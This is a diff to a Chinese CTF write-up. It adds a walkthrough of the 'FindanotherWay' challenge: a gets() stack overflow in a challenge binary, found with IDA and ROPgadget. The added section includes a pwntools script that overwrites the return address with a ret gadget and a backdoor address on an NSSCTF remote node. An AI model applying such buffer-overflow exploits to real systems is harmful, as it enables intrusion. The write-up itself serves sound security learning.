@@ -398,7 +398,7 @@ ls一下看看有哪些文件<br>
 ***
 用jadx打开下载的.apk文件后搜索NSSCTF即可找到flag
 ![alt text](image-65.png)
-###三.level1
+### 三.level1
 下载下来的level1文件夹里包含了一个无后缀文件和一个txt的output文件
 ![alt text](image-68.png)
 用010editor打开无后缀文件
@@ -437,6 +437,35 @@ print(flag)
 ```
 得到ctf2020{d9-dE6-20c}
 
+### 四.FindanotherWay
+这里题目名字的意思就是直接nc不行
+![alt text](image-71.png)<br>
+下载给出的文件，没有后缀名，用IDA打开
+查看main函数
+![alt text](image-75.png)
+查看vuln函数
+![alt text](image-76.png)
+这个gets函数存在栈溢出，s的大小为12，找到可以造成溢出的padding
+![alt text](image-72.png)
+显然我们的目标是调用这个youfindit，地址为401230
+***
+调用后门函数的步骤：在 Payload 里加入gadeget：ret或pop rdi ; ret（取决于函数是否包含参数）
+来确保栈对齐，避免ROP执行时的崩溃，所以要先溢出缓冲区，用gadget覆盖返回地址，随后写入后门函数地址
+***
+![alt text](image-73.png)
+这里用ROPgadget找到合适的gadget地址，即40101a,此时可以编写代码攻击
+```python
+from pwn import *
+p = remote("node5.anna.nssctf.cn", 23483)
+
+Padding = b'A' * 12 + p64(0)
+backdoor = p64(0x401230)
+gadget = p64(0x40101a)
+payload = Padding + gadget + backdoor
+p.sendline(payload)
+p.interactive()
+```
+![alt text](image-74.png)
 ## 2.12 进阶，弱比较，数组绕过，反序列化
 ### 一.受不了一点
 打开网站后发现php源代码
